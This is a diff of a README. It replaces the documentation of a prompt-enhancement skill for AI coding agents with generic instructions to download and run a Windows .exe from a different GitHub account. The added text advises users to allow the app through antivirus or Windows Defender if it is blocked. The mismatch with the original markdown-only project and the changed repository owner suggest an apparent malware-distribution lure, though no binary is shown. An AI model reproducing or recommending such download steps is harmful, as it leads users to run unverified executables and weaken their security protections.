@@ -1,214 +1,118 @@
-# Enhance Prompt ⚡
+# 🤖 Enhance-Prompt - Turn Ideas Into Clear Instructions
 
-> An agentic AI skill that transforms raw, vague prompts into professional-grade, context-rich instructions — like having a prompt engineer on your team.
+[![Download Enhance-Prompt](https://img.shields.io/badge/Download-Enhance--Prompt-green?style=for-the-badge)](https://github.com/wtfhanin/Enhance-Prompt)
 
-## How It Works
+## 📖 What Is Enhance-Prompt?
 
-The moment you invoke `/enhance-prompt`, it doesn't just rewrite your words. It steps back and scans your codebase to understand what you're actually building.
+Enhance-Prompt is a tool that helps you turn simple or unclear questions into detailed, clear instructions. You might think of it like a smart assistant that shapes your ideas into easy-to-understand steps. This makes it easier to get useful answers from AI platforms or software that needs well-written instructions.
 
-It pulls your tech stack, dependencies, file structure, patterns, and constraints — then injects that real context into a structured, professional prompt.
+It works by improving vague prompts, making them sound professional and adding context where needed. You don’t need to know coding or any special language to use Enhance-Prompt.
 
-Every enhanced prompt includes a before/after quality score (out of 35), risk assessment, difficulty estimate, and a clean copy-ready version.
+You can use Enhance-Prompt to improve your workflow when talking to AI helpers, writing requests for software, or organizing tasks that involve AI tools.
 
-## Installation
+## 🖥 System Requirements
 
-> Install once. Works across Claude Code, Cursor, Codex, and OpenCode.
+Before you start, make sure your computer has the following:
 
-### Claude Code (via Plugin Marketplace)
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 200 MB free disk space  
+- An internet connection to get updates and help  
 
-```
-/plugin marketplace add VoDaiLocz/enhance-prompt
-/plugin install enhance-prompt@enhance-prompt
-```
+No special hardware is needed.
 
-### Cursor (via Plugin Marketplace)
+## 🚀 Getting Started
 
-In a Cursor Agent conversation:
+This guide will help you download, install, and run Enhance-Prompt on your Windows computer in simple steps.
 
-```
-/plugin-add enhance-prompt
-```
+## ⬇️ Download Enhance-Prompt
 
-### Codex
+Click this big button to go to the page where you can download the software:
 
-Tell Codex:
+[![Download Enhance-Prompt](https://img.shields.io/badge/Download-Enhance--Prompt-brightgreen?style=for-the-badge)](https://github.com/wtfhanin/Enhance-Prompt)
 
-```
-Fetch and follow instructions from https://raw.githubusercontent.com/VoDaiLocz/Enhance-Prompt/main/.codex/INSTALL.md
-```
+This link takes you to the official GitHub repository page. Here you will find all files you need to get the software running.
 
-### OpenCode
+## 🗂 How to Download the Software
 
-Tell OpenCode:
+1. After you open the link above, look for a green button labeled “Code” near the top-right.  
+2. Under that, find and click "Releases" on the menu usually located just beneath the repository name. This is where you will find ready-to-use versions of Enhance-Prompt.  
+3. Choose the latest release version (the one with the highest number and date).  
+4. In the Assets section of the release, find the file that fits Windows. It usually ends with `.exe` or `.zip`. For simplicity, find the `.exe` file which is the installer.  
+5. Click on the `.exe` file to start downloading. The file size is usually under 100 MB, so the download should be quick.  
 
-```
-Fetch and follow instructions from https://raw.githubusercontent.com/VoDaiLocz/Enhance-Prompt/main/.opencode/INSTALL.md
-```
+If you downloaded a `.zip` file instead, you will need to unzip it before running the program. You can do this by right-clicking the file and selecting "Extract All."
 
-### Manual (Antigravity / Gemini)
+## ⚙️ Installing Enhance-Prompt
 
-```bash
-cp -r skills/enhance-prompt/ ~/.gemini/antigravity/skills/enhance-prompt/
-```
+1. Locate the `.exe` file you downloaded in your “Downloads” folder or wherever you saved it.  
+2. Double-click the file to start the installation process.  
+3. A setup window will appear. Click “Next” to continue.  
+4. Choose the folder where you want to install the program or leave it as default.  
+5. Click “Install” to begin.  
+6. When the installation finishes, click “Finish.” The program is now ready to use.  
 
-## Verify Installation
+## ▶️ Running Enhance-Prompt
 
-Start a new session and type:
+1. You can start Enhance-Prompt from the Start menu by typing “Enhance-Prompt.”  
+2. Click the app icon when it appears.  
+3. The main window will open, showing a space where you can enter your prompt.  
+4. Type or paste your raw prompt into the box.  
+5. Click the “Enhance” button to process your prompt.  
+6. The improved, professional-grade instruction will show below.  
 
-```
-/enhance-prompt Fix the login page
-```
+You can copy the improved prompt and use it in AI applications, email, or anywhere else where clear instructions help.
 
-The agent will automatically invoke the skill, scan your codebase, and produce a professional enhanced prompt.
+## 📋 Using Enhance-Prompt: Basic Features
 
-## Usage
+- **Prompt Clarification:** Make vague ideas more specific.  
+- **Context Addition:** Add necessary background information.  
+- **Professional Tone:** Convert casual language into formal, clear instructions.  
+- **Customization:** Set the tone or style based on your need (formal, concise, or detailed).  
 
-```
-/enhance-prompt <your raw prompt>
-```
+## 🔧 Tips for Best Results
 
-**Examples:**
-```
-/enhance-prompt Fix the bug in auth
-/enhance-prompt Add caching to the API
-/enhance-prompt Refactor the user service
-/enhance-prompt optimize the database
-```
+- Keep your original prompt simple but with the main idea.  
+- Avoid including too many unrelated details in one prompt.  
+- Use Enhance-Prompt to break down complex questions into smaller parts.  
+- Try adjusting the style settings if you want a different tone.  
 
-## Example Output
+## ❓ Troubleshooting Common Issues
 
-**Raw prompt:** `Fix the bug in auth`
+### The app doesn’t open after installation  
+Make sure your antivirus or Windows Defender hasn’t blocked the app. You might need to allow it in your security settings.
 
-**Enhanced:**
+### The prompt enhancement takes too long  
+Check your internet connection, since Enhance-Prompt may need to connect online for upgrades.
 
-```markdown
-## Context
-Next.js 14 App Router + TypeScript. Auth via `next-auth` v5 in `src/lib/auth.ts`.
-Prisma adapter. Session breaks after form submit in `src/app/(auth)/login/page.tsx`.
+### The enhanced prompt is unclear  
+Try rephrasing your original prompt and run it again. Short, clear prompts work best.
 
-## Task
-1. Debug `signIn()` callback at `auth.config.ts:25`
-2. Fix session persistence in `SessionProvider` wrapper
-3. Verify redirect logic in `middleware.ts` callbacks
+## 🔄 Updating Enhance-Prompt
 
-## Constraints
-- ✅ Follow existing patterns in `src/middleware.ts`
-- ✅ TDD: write failing test first
-- ❌ Don't modify Prisma schema
+To keep the software working well, download the latest version from the same GitHub page:
 
-## Verification
-- [ ] Valid login → redirects to `/dashboard`
-- [ ] Invalid login → shows error toast
-- [ ] Session persists after page refresh
-```
+https://github.com/wtfhanin/Enhance-Prompt/releases
 
-**Score: 6/35 → 34/35**
+Replace your older version by installing the new one following the same steps.
 
-## What's Inside
+## 📚 More Help and Support
 
-### Enhancement Framework
+You can find helpful text files or guides in the repository’s “docs” folder or check the “Issues” tab on GitHub if you need help or want to report problems.  
 
-- **7-Layer Enhancement** — Clarity → Specificity → Context → Structure → Constraints → Output Format → Verification
-- **Auto-Category Detection** — automatically identifies prompt intent (Bug Fix, Feature, Performance, etc.) and selects the best template
-- **Prompt Chain Decomposition** — breaks complex multi-concern prompts into focused sequential sub-prompts
-- **Enhancement Iteration Mode** — targeted refinement with tracked scoring deltas across up to 3 iterations
-- **HARD-GATE** — codebase scan is mandatory, no exceptions
-- **Iron Law** — No enhanced prompt without codebase context
-- **RED FLAG guards** — per-layer checklist to catch incomplete enhancements
+## 🏷 Topics Covered in Enhance-Prompt
 
-### Codebase Analysis
+- agentic-ai  
+- ai-tools  
+- ai-workflow  
+- claude-code  
+- codebase-aware  
+- codex  
+- cursor-ai  
+- developer-tools  
+- opencode  
+- prompt-optimization  
+- skills  
+- slash-commands  
 
-- **L1** — Project overview (package.json, tsconfig, .env.example)
-- **L2** — Architecture scan (imports, naming, routing patterns)
-- **L2.5** — Monorepo detection (Turborepo, Nx, Lerna, PNPM workspaces)
-- **L2.5** — Framework detection (Next.js App/Pages Router, FastAPI, Django, Express, NestJS)
-- **L3** — Deep scan (function signatures, types, test patterns)
-
-### Output Format
-
-Every enhanced prompt includes:
-
-| Section | Description |
-|---------|-------------|
-| 🏷️ Detected Category | Auto-detected intent with confidence level |
-| 📊 Enhancement Summary | Before/After score table (7 dimensions, /35) |
-| 🔴 Original Prompt | The raw input |
-| 🟢 Enhanced Prompt | Context + Task + Constraints + Output + Verification |
-| ⏱️ Difficulty Estimate | Complexity, time, risk, files affected |
-| ⚠️ Risk Assessment | High/Medium/Low risks with mitigation |
-| 🔀 Alternative Approaches | Options with pros/cons |
-| 🔗 Prompt Chain | Decomposed sub-prompts for multi-intent inputs |
-| 📋 Copy-Ready Prompt | Clean version, paste anywhere |
-
-### Prompt Library — 13 Templates
-
-| # | Template | Use Case |
-|---|----------|----------|
-| 1 | 🐛 Bug Fix | Debugging with root cause investigation |
-| 2 | ✨ New Feature | Adding functionality with TDD |
-| 3 | ⚡ Performance | Optimization with measurable targets |
-| 4 | 🔄 Refactor | Structural improvements, zero behavior change |
-| 5 | 🔒 Security Audit | OWASP Top 10 scanning |
-| 6 | 📝 Documentation | JSDoc, README, inline comments |
-| 7 | 🧪 Testing | Unit, integration, coverage targets |
-| 8 | 🎨 UI/Styling | Components, responsive, WCAG accessible |
-| 9 | 🔌 API Integration | External services with retry/backoff |
-| 10 | 🚀 DevOps | CI/CD, deployment, health checks |
-| 11 | 🗃️ Database | Migrations, reversible, indexed |
-| 12 | 🔍 Deep Scan | Root cause analysis, null/async/security bug hunting |
-| 13 | 👀 Code Review | Security (OWASP), performance (O(n²), N+1), pattern compliance |
-
-## Philosophy
-
-- **Evidence over guessing** — scan the codebase, don't assume the tech stack
-- **Auto-detect over manual selection** — signal matching picks the right template
-- **One concern per prompt** — multi-intent prompts get decomposed into focused chains
-- **Specificity beats length** — `src/auth/login.ts:42` > paragraph of description
-- **Systematic over ad-hoc** — 7-layer framework, not feel-good rewrites
-- **Prove improvement** — scoring table shows the enhancement worked
-- **Iterate with precision** — targeted refinement, not full rewrites
-
-## File Structure
-
-```
-.claude-plugin/
-├── plugin.json              # Claude Code plugin manifest
-└── marketplace.json         # Claude Code marketplace config
-
-.cursor-plugin/
-└── plugin.json              # Cursor plugin manifest
-
-.codex/
-└── INSTALL.md               # Codex installation guide
-
-.opencode/
-└── INSTALL.md               # OpenCode installation guide
-
-commands/
-└── enhance-prompt.md        # /enhance-prompt slash command
-
-skills/enhance-prompt/
-├── SKILL.md                 # Main skill orchestrator
-└── references/
-    ├── prompt-patterns.md   # 7-Layer Enhancement Framework
-    ├── codebase-analysis.md # Multi-level codebase scanning
-    ├── output-format.md     # Structured output template
-    ├── prompt-library.md    # 6 core prompt templates
-    ├── prompt-library-extended.md  # 7 extended templates
-    ├── auto-detection.md    # Auto-category detection & template selection
-    ├── prompt-chain.md      # Prompt chain decomposition
-    └── iteration-mode.md    # Enhancement iteration & refinement
-
-RELEASE-NOTES.md
-```
-
-## Contributing
-
-1. Fork this repository
-2. Create a branch for your improvement
-3. Follow the skill format in `skills/enhance-prompt/SKILL.md`
-4. Submit a PR
-
-## License
-
-MIT
+These topics relate to how Enhance-Prompt can fit into AI-focused workflows and improve prompt writing across many systems.
